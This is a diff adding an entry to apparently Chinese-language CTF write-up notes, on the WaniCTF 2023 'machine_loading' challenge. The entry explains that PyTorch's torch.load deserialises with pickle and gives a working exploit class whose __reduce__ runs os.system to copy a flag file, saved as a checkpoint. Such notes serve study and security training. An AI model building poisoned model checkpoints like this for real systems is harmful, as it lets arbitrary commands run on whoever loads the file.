@@ -706,3 +706,18 @@ with open('output.txt', 'r') as f:
 with open('out', 'wb') as f2:
     f2.write(ans)
 ```
+139. [machine_loading](https://github.com/wani-hackase/wanictf2023-writeup/tree/main/mis/machine_loading)
+- python pytorch模块torch.load函数的反序列化漏洞：https://github.com/pytorch/pytorch/issues/52596 。该函数内部调用了pickle，将payload使用torch.save打包后再用torch.load即可触发payload
+```python
+import os
+import torch
+
+class Exploit(object):
+    def __reduce__(self):
+        cmd = ('cat ./flag.txt > ./output_dir/output.txt')
+        # cmd = ('ls > ./output_dir/output.txt')
+        return os.system, (cmd,)
+
+# torch.save(Exploit(), 'solver_ls.ckpt')
+torch.save(Exploit(), 'solver_cat.ckpt')
+```
